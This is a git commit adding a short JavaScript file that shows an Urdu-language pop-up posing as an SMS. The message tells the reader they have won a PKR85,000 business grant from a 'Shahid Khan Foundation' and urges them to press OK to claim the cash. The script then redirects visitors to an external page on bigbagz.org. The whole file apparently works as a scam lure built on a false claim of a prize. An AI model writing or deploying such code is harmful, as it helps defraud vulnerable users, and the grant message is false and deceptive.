c849730a421c68f5ad5ac5352778866a106417b4
bigbagzz <usakpolo247@gmail.com>
2025-05-24 23:11:32 +0100

    Create pakistan-active.js

---
+++ pakistan-active.js
@@ -0,0 +1,5 @@
+var password = 'PKR85,000 واپس لیں۔'
+password=prompt('SMS: مبارک ہو، آپ شاہد خان فاؤنڈیشن سے PKR85,000 بزنس سپورٹ گرانٹ حاصل کرنے والوں میں شامل ہیں، ابھی کیش نکالنے کے لیے اوکے کو دبائیں ','PKR85,000 واپس لیں۔');
+if (password != 'PKR85,000 واپس لیں۔') {
+location.href='https://bigbagz.org/pakis-grant.html';
+}
